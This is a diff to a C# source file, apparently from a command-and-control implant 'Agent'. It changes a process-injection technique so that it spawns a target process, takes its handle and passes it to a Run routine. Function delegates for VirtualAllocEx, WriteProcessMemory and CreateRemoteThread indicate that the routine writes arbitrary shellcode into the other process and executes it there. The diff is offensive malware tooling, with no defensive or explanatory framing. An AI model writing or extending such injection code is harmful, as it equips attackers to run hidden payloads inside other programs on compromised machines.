@@ -7,6 +7,9 @@ using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using Agent.Interfaces;
+using Agent.Models;
+using Microsoft.Win32.SafeHandles;
 
 namespace Agent
 {
@@ -16,14 +19,19 @@ namespace Agent
         private delegate IntPtr VirtAllocExDelegate(IntPtr target, IntPtr lpAddress, UInt32 dwSize, Native.AllocationType flAllocationType, Native.MemoryProtection flProtect);
         private delegate bool WriteProcMemDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
         private delegate nint CrtDelegate(IntPtr target, IntPtr lpAddress, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, Native.ThreadCreationFlags dwCreationFlags, out IntPtr hThread);
-        public bool Inject(byte[] shellcode, IntPtr hTarget)
+        async Task<bool> ITechnique.Inject(ISpawner spawner, SpawnOptions spawnOptions, byte[] shellcode)
         {
-            return this.Run(hTarget, shellcode);
-        }
+            if (!await spawner.Spawn(spawnOptions))
+            {
+                return false;
+            }
+            SafeProcessHandle hProc;
+            if (!spawner.TryGetHandle(spawnOptions.task_id, out hProc))
+            {
+                return false;
+            }
 
-        public bool Inject(byte[] shellcode, Process proc)
-        {
-            return this.Run(proc.Handle, shellcode);
+            return Run(hProc.DangerousGetHandle(), shellcode);
         }
 
         private bool Run(IntPtr target, byte[] shellcode)
